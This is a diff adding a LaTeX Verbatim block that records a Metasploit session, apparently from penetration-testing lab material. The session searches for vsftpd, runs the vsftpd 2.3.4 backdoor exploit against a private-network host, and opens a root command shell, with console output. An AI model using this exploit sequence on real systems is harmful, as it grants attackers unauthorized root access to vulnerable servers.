@@ -1,0 +1,26 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+msf5 exploit\PYG{o}{(}auxiliary/scanner/ftp/anonymous\PYG{o}{)} \PYGZgt{} search vsftpd
+
+Matching \PYG{n+nv}{Modules}
+\PYG{o}{================}
+
+   \PYG{c+c1}{\PYGZsh{}  Name                                  Disclosure Date  Rank       Check  Description}
+   \PYGZhy{}  \PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}                                  \PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}  \PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}       \PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}  \PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}\PYGZhy{}
+   \PYG{l+m}{0}  exploit/unix/ftp/vsftpd\PYGZus{}234\PYGZus{}backdoor  \PYG{l+m}{2011}\PYGZhy{}07\PYGZhy{}03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf5 exploit\PYG{o}{(}auxiliary/scanner/ftp/anonymous\PYG{o}{)} \PYGZgt{}
+msf5 exploit\PYG{o}{(}auxiliary/scanner/ftp/anonymous\PYG{o}{)} \PYGZgt{} use exploit/unix/ftp/vsftpd\PYGZus{}234\PYGZus{}backdoor
+\PYG{o}{[}*\PYG{o}{]} Using configured payload cmd/unix/interact
+msf5 exploit\PYG{o}{(}unix/ftp/vsftpd\PYGZus{}234\PYGZus{}backdoor\PYG{o}{)} \PYGZgt{} \PYG{n+nb}{set} rhosts \PYG{l+m}{192}.168.0.184
+\PYG{n+nv}{rhosts} \PYG{o}{=}\PYGZgt{} \PYG{l+m}{192}.168.0.184
+msf5 exploit\PYG{o}{(}unix/ftp/vsftpd\PYGZus{}234\PYGZus{}backdoor\PYG{o}{)} \PYGZgt{} exploit
+
+\PYG{o}{[}*\PYG{o}{]} \PYG{l+m}{192}.168.0.184:21 \PYGZhy{} Banner: \PYG{l+m}{220} \PYG{o}{(}vsFTPd \PYG{l+m}{2}.3.4\PYG{o}{)}
+\PYG{o}{[}*\PYG{o}{]} \PYG{l+m}{192}.168.0.184:21 \PYGZhy{} USER: \PYG{l+m}{331} Please specify the password.
+\PYG{o}{[}+\PYG{o}{]} \PYG{l+m}{192}.168.0.184:21 \PYGZhy{} Backdoor service has been spawned, handling...
+\PYG{o}{[}+\PYG{o}{]} \PYG{l+m}{192}.168.0.184:21 \PYGZhy{} UID: \PYG{n+nv}{uid}\PYG{o}{=}\PYG{l+m}{0}\PYG{o}{(}root\PYG{o}{)} \PYG{n+nv}{gid}\PYG{o}{=}\PYG{l+m}{0}\PYG{o}{(}root\PYG{o}{)}
+\PYG{o}{[}*\PYG{o}{]} Found shell.
+\PYG{o}{[}*\PYG{o}{]} Command shell session \PYG{l+m}{1} opened \PYG{o}{(}\PYG{l+m}{0}.0.0.0:0 \PYGZhy{}\PYGZgt{} \PYG{l+m}{192}.168.0.184:6200\PYG{o}{)} at \PYG{l+m}{2020}\PYGZhy{}08\PYGZhy{}02 \PYG{l+m}{23}:00:50 +0000
+root
+\end{Verbatim}
